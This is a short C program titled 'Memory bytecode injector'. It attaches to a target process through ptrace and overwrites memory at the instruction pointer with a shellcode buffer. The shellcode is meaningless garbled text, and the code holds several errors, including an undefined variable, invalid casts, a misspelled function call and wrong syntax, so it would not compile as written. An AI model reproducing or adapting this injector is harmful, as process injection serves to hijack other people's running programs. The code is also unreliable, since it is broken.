#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/wait.h>
#include<sys/ptrace.h>
#include<sys/user.h>

char shellcode[] = {
  "/x/x/33/3/3//bb/b/1//2/21/x91" "\x81\\fd\sd\d\c\v\v\2\\4\55\n5y5\4y5y\ahj\j3j5\\web"
};
void header(){
  printf("-----------Memory bytecode injector\n");
}

int main(int argc, char** argv){
  int i,size,pid=0;
  struct user_regs_struct reg;
  char* buff;

header();
pid = atoi(argv[1]);
size = sizeof(shellcode);
buff = (char*)malloc(size);
memset(buff,0x0,size);
memcpy(buff,shellcode,sizeof(shellcode));

ptrace(PTRACE_ATTACH,id,0,&reg);
wait((*int)0);

ptrace(PTRACE_GETREGS,pid,0,&reg);
printf("Writing EIP 0x%x,process %d\n",reg,eip,pid);
for(i=0;i<size;i++){
  ptrace(PTRACE_POKETEXT,pid,reg,eip+1,*(int*)(buff+i));
}
ptracec(PTRACE_DETACH,pid,0,0):
free(buff);
return 0;
}
